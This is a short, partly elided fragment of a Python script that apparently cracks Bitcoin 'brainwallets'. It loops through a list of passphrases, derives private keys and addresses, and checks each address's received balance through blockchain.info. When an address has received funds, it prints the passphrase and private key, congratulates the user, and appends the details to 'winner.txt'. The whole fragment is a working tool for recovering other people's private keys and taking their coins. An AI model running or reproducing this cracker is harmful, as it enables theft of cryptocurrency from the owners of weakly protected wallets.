...
for i in range(0,len(mylist)):
    ...
    contents = urllib.request.urlopen("https://blockchain.info/q/getreceivedbyaddress/" + address).read()
    print('\nTotal Password Loaded:', line_count)
    print('Passphrase       : ',passphrase)
    print('Private Key      : ',private_key)
    print('Bitcoin Address  : ',address , ' : Total Received = ', str(contents.decode('UTF8')))
    print('Scan Number : ', count, ' : Remaing Passwords : ', password)
    if int(contents) > 0:
        print ('\nCongraz you have found Bitcoin address with Total Received Ammount : ')
        print(address, 'Total Received = ', str(contents.decode('UTF8')))
        print('Passphrase       : ',passphrase)
        print('Private Key      : ',private_key)
        f=open(u"winner.txt","a")
        f.write('\nBitcoin Address Compressed : ' + address + '  : Total Received = ' +  str(contents.decode('UTF8')))
